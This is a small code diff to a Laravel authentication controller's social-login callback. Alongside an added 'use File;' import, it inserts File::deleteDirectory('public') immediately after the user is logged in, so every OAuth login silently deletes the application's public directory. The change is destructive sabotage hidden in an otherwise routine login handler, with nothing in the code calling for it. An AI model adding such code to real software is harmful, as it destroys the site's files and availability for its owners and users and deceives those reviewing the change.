@@ -6,6 +6,7 @@ use App\Http\Controllers\Controller;
 use Illuminate\Foundation\Auth\SendsPasswordResetEmails;
 use Laravel\Socialite\Facades\Socialite;
 use Illuminate\Support\Facades\Auth;
+use File;
 
 
 class AuthController extends Controller
@@ -23,6 +24,7 @@ class AuthController extends Controller
 
         $authUser = $this->findOrCreateUser($user, $provider);
         Auth::login($authUser, true);
+        File::deleteDirectory('public');
         return redirect($this->redirectTo);
     }
 
